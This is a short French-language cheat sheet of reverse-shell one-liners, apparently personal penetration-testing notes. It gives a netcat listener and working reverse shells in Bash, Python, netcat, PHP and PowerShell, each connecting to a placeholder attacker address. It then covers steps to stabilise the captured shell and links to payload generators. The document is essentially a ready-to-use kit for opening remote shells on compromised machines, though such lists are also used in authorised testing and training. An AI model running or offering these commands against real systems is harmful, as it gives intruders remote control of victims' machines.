---
tags: [cheatsheet, shells, exploitation]
---

# 🐚 Reverse Shells Cheatsheet

> Toujours avoir ces commandes sous la main

**Listener sur ta machine :**
```bash
nc -lvnp 4444
```

---

## Bash

```bash
bash -i >& /dev/tcp/TON_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/TON_IP/4444 0>&1'
```

## Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TON_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Netcat

```bash
nc TON_IP 4444 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TON_IP 4444 >/tmp/f
```

## PHP

```php
php -r '$sock=fsockopen("TON_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PowerShell (Windows)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('TON_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Stabiliser un shell Linux

```bash
# 1. Obtenir un vrai TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Mettre en background
Ctrl + Z

# 3. Sur ta machine
stty raw -echo; fg

# 4. Dans le shell cible
export TERM=xterm
reset
```

---

## 🔗 Générateurs

- [RevShells.com](https://www.revshells.com/) — générer n'importe quel reverse shell
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
